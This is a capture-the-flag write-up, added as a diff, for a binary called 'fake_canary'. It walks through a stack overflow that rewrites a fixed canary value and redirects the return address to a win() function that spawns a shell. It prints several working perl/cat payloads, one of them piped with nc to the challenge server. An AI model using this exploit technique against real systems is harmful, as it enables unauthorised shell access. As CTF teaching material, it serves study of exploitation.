@@ -1,0 +1,55 @@
+Reversing
+---------
+looking at the disassembly, it looks pretty similar to stackoverflow
+
+there is a value put on the stack and later it checks that it is still there
+
+we have the ability to smash the stack, but if we destroy that value, it will exit
+
+because it's a fixed value, though, we can just overwrite it with the same value
+
+so now that we can overwrite the stack, what can we do?
+
+there is a win() function which does the same system call with /bin/sh as stackoverflow
+
+so if we can get into that, we get a remote shell
+
+
+
+The Attack
+----------
+because we can smash the stack, we can control where the function returns to
+
+    [current stack frame]
+    [saved rbp]
+    [saved rip]
+    [previous stack frame]
+
+looking again at the disassembly, we are writing into $rbp-0x30, the "canary" of 0x00000000deadbeef is at $rbp-0x08, the saved rbp is at $rbp, and the saved rip is right after.  we want to write the location of win() into the saved rip and the same canary value into where it's already at.
+
+keep in mind it's a 64bit executable, so the addresses are 8 bytes.  This means the saved rbp and saved rip are both 8 bytes.  The canary also happens to be 8 bytes (it was probably just implemented with an int).
+
+    perl -e 'print "AAAA"x10 ."\xef\xbe\xad\xde" ."\x00"x4 ."\x40\x07\x40\x00\x00\x00\x00\x00" ."\x29\x07\x40\x00\x00\x00\x00\x00";' | ./fake_canary
+
+
+
+Cat Tricks
+----------
+and, of course, this doesn't work for the same reason as stackoverflow.  It is getting past the canary, setting up rip to get into win(), and getting to the shell, but because stdin immediately closes at the end of the payload, the shell just closes
+
+we can use the cat trick from before to get around that
+
+    cat <(perl -e 'print "AAAA"x10 ."\xef\xbe\xad\xde" ."\x00"x4 ."\x40\x07\x40\x00\x00\x00\x00\x00" ."\x29\x07\x40\x00\x00\x00\x00\x00";') - | ./fake_canary
+
+and, of course, this doesn't quite work either, and will instead just sit at the prompt. gets isn't getting an eof anymore and isn't returning, so we need to put a newline in for gets to return
+
+our final working payload
+
+    cat <(perl -e 'print "AAAA"x10 ."\xef\xbe\xad\xde" ."\x00"x4 ."\x40\x07\x40\x00\x00\x00\x00\x00" ."\x29\x07\x40\x00\x00\x00\x00\x00\n";') - | ./fake_canary
+
+and this works against netcat as well
+
+    cat <(perl -e 'print "AAAA"x10 ."\xef\xbe\xad\xde" ."\x00"x4 ."\x40\x07\x40\x00\x00\x00\x00\x00" ."\x29\x07\x40\x00\x00\x00\x00\x00\n";') - | nc chal.imaginaryctf.org 42002
+
+from here we can ls to find flag.txt and cat flag.txt
+
